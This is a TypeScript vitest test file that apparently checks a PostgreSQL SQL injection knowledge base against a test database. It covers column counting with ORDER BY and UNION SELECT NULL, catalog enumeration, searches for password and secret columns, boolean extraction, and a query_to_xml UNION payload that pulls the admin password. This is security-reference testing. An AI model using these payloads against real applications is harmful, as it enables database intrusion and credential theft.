/**
 * PostgreSQL Tables and Columns Enumeration Tests
 *
 * @kb-coverage postgresql/tables-and-columns - Full coverage
 */

import { describe, test, expect, beforeAll, afterAll } from "vitest";
import {
  initDirectRunner,
  cleanupDirectRunner,
  directSQL,
  directSQLExpectSuccess,
} from "../../src/runner/direct.js";
import { logger } from "../../src/utils/logger.js";

describe("PostgreSQL Tables and Columns Enumeration", () => {
  beforeAll(async () => {
    logger.setLevel("warn");
    await initDirectRunner();
  }, 30000);

  afterAll(async () => {
    await cleanupDirectRunner();
  }, 10000);

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section Determining Number of Columns
   */
  describe("Determining number of columns", () => {
    test("ORDER BY enumeration finds valid columns", async () => {
      let maxColumn = 0;
      for (let i = 1; i <= 10; i++) {
        const { success } = await directSQL(`SELECT * FROM users ORDER BY ${i}`);
        if (success) {
          maxColumn = i;
        } else {
          break;
        }
      }
      expect(maxColumn).toBeGreaterThan(0);
    });

    test("UNION SELECT NULL technique", async () => {
      let columnCount = 0;
      for (let i = 1; i <= 10; i++) {
        const nulls = Array(i).fill("NULL").join(", ");
        const { success } = await directSQL(
          `SELECT * FROM users WHERE id = 1 UNION SELECT ${nulls}`
        );
        if (success) {
          columnCount = i;
          break;
        }
      }
      expect(columnCount).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section Retrieving Tables from information_schema
   */
  describe("Retrieving tables from information_schema", () => {
    test("Query public schema tables", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"
      );
      const tableNames = rows.map((r) => (r as { table_name: string }).table_name);
      expect(tableNames).toContain("users");
      expect(tableNames).toContain("products");
    });

    test("Query all user tables excluding system schemas", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT table_schema, table_name FROM information_schema.tables
        WHERE table_schema NOT IN ('pg_catalog', 'information_schema')
      `);
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Aggregate table names with string_agg", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT string_agg(table_name, ',') as tables FROM information_schema.tables WHERE table_schema = 'public'"
      );
      const tables = (rows[0] as { tables: string }).tables;
      expect(tables).toContain("users");
    });
  });

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section Retrieving Tables from pg_catalog
   */
  describe("Retrieving tables from pg_catalog", () => {
    test("Query pg_tables for public schema", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT tablename FROM pg_tables WHERE schemaname = 'public'"
      );
      const tableNames = rows.map((r) => (r as { tablename: string }).tablename);
      expect(tableNames).toContain("users");
    });

    test("Query pg_class for relations", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT relname FROM pg_class
        WHERE relkind = 'r'
        AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public')
      `);
      const relNames = rows.map((r) => (r as { relname: string }).relname);
      expect(relNames).toContain("users");
    });
  });

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section Retrieving Columns from information_schema
   */
  describe("Retrieving columns from information_schema", () => {
    test("Query columns for users table", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users'"
      );
      const columns = rows.map((r) => (r as { column_name: string }).column_name);
      expect(columns).toContain("username");
      expect(columns).toContain("password");
    });

    test("Aggregate columns with string_agg", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT string_agg(column_name, ',') as cols FROM information_schema.columns WHERE table_name = 'users'"
      );
      const cols = (rows[0] as { cols: string }).cols;
      expect(cols).toContain("username");
    });

    test("Find sensitive columns by name pattern", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT table_name, column_name FROM information_schema.columns
        WHERE column_name LIKE '%pass%'
        OR column_name LIKE '%pwd%'
        OR column_name LIKE '%secret%'
      `);
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section Retrieving Columns from pg_catalog
   */
  describe("Retrieving columns from pg_catalog", () => {
    test("Query pg_attribute for column names", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT a.attname FROM pg_attribute a
        JOIN pg_class c ON a.attrelid = c.oid
        WHERE c.relname = 'users' AND a.attnum > 0 AND NOT a.attisdropped
      `);
      const columns = rows.map((r) => (r as { attname: string }).attname);
      expect(columns).toContain("username");
    });
  });

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section Injection Examples
   */
  describe("Injection context examples", () => {
    test("UNION SELECT table names", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, table_name FROM information_schema.tables WHERE table_schema='public'
      `);
      const values = rows.map((r) => (r as { username: string }).username);
      expect(values).toContain("users");
    });

    test("UNION SELECT column names", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, column_name FROM information_schema.columns WHERE table_name='users'
      `);
      const values = rows.map((r) => (r as { username: string }).username);
      expect(values).toContain("password");
    });

    test("Boolean-based table name extraction", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT CASE
          WHEN SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1)='u'
          THEN true
          ELSE false
        END as result
      `);
      expect(typeof (rows[0] as { result: boolean }).result).toBe("boolean");
    });
  });

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section Using LIMIT and OFFSET
   */
  describe("Using LIMIT and OFFSET", () => {
    test("LIMIT 1 OFFSET 0 gets first table", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 0"
      );
      expect(rows.length).toBe(1);
    });

    test("LIMIT 1 OFFSET 1 gets second table", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1"
      );
      expect(rows.length).toBeLessThanOrEqual(1);
    });
  });

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section Finding Interesting Tables
   */
  describe("Finding interesting tables", () => {
    test("Search for user-related tables", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT table_name FROM information_schema.tables
        WHERE table_name LIKE '%user%'
        OR table_name LIKE '%admin%'
        OR table_name LIKE '%account%'
        OR table_name LIKE '%member%'
        OR table_name LIKE '%login%'
      `);
      const tables = rows.map((r) => (r as { table_name: string }).table_name);
      expect(tables).toContain("users");
    });
  });

  /**
   * @kb-entry postgresql/tables-and-columns
   * @kb-section XML Helper Functions for Data Extraction
   */
  describe("XML helper functions for data extraction", () => {
    test("query_to_xml() extracts query results as XML", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT query_to_xml('SELECT username FROM users LIMIT 1', true, true, '')"
      );
      const xml = (rows[0] as { query_to_xml: string }).query_to_xml;
      expect(xml).toContain("<username>");
      expect(xml).toContain("</username>");
    });

    test("query_to_xml() can extract multiple columns", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT query_to_xml('SELECT id, username FROM users LIMIT 2', true, true, '')"
      );
      const xml = (rows[0] as { query_to_xml: string }).query_to_xml;
      expect(xml).toContain("<id>");
      expect(xml).toContain("<username>");
    });

    test("table_to_xml() extracts entire table as XML", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT table_to_xml('users', true, true, '')");
      const xml = (rows[0] as { table_to_xml: string }).table_to_xml;
      // Each row is wrapped in <users> tags with namespace
      expect(xml).toContain("<users");
      expect(xml).toContain("<username>");
      expect(xml).toContain("</users>");
    });

    test("database_to_xmlschema() extracts schema structure", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT database_to_xmlschema(true, true, '')");
      const xml = (rows[0] as { database_to_xmlschema: string }).database_to_xmlschema;
      expect(xml).toContain("schema");
    });

    test("query_to_xml() in UNION injection context", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, query_to_xml('SELECT password FROM users WHERE username=''admin''', true, true, '')::text
      `);
      const values = rows.map((r) => (r as { username: string }).username);
      const xmlResult = values.find((v) => v.includes("<password>"));
      expect(xmlResult).toBeTruthy();
    });
  });
});
